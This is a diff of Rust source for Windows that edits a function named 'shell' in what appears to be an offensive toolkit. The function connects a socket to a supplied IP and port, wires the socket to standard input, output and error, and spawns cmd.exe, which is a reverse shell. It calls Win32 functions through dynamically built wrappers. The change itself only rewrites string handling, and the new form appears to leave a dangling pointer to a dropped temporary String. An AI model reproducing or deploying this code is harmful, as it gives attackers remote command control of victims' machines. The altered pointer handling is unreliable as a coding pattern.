@@ -1,4 +1,4 @@
-use std::ffi::{c_void, CStr, CString};
+use std::ffi::{c_void, CStr};
 use std::{mem, ptr};
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{BOOL, HANDLE};
@@ -41,7 +41,7 @@ pub fn shell(ip: &str, port: u16) {
         ..Default::default()
     };
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
-    let ip_pcstr = PCSTR(CString::new(ip).unwrap().into_raw() as *mut u8);
+    let ip_pcstr = PCSTR::from_raw(format!("{ip}\0").as_mut_ptr());
     let function = rco_utils::construct_win32_function!(function; [i32, PCSTR, *mut c_void]; [i32]);
     unsafe { function(AF_INET.0 as i32, ip_pcstr, sin_addr_ptr) };
 
@@ -81,11 +81,7 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
-    let lp_command_line = PSTR(
-        CString::new(format!("{system_dir}\\cmd.exe"))
-            .unwrap()
-            .into_raw() as *mut u8,
-    );
+    let lp_command_line = PSTR::from_raw(format!("{system_dir}\\cmd.exe\0").as_mut_ptr());
     let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
     unsafe {
         function(
